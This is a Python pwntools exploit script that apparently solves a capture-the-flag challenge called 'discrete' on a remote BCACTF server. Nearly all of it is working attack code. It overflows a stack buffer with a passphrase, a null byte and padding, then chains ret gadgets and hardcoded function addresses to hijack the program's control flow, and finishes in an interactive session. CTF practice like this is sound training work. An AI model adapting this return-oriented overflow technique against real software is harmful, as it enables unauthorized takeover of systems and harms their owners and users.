from pwn import *
import time
context.update(os="linux", arch="i686")

#p = process("./discrete")
p = remote("bin.bcactf.com", 49160)
p.recvuntil("> ")

POP_RDI_RET = p64(0x004017a3)
LOGIC_FN = p64(0x401236)
ALGEBRA_FN = p64(0x401336)
FUNCTIONS_FN = p64(0x40144d)
QUIZ_FN = p64(0x401544)
MAIN_FN  = p64(0x401611)
RETN_GADGET = p64(0x00000000004017A4)

PAYLOAD = ("i will get an A" + "\x00" + ("A" * 48) + "BBBBBBBB").encode("ASCII") + RETN_GADGET + LOGIC_FN + RETN_GADGET + ALGEBRA_FN + RETN_GADGET + FUNCTIONS_FN + RETN_GADGET + QUIZ_FN
print(len(PAYLOAD))

p.sendline(PAYLOAD)
p.interactive()
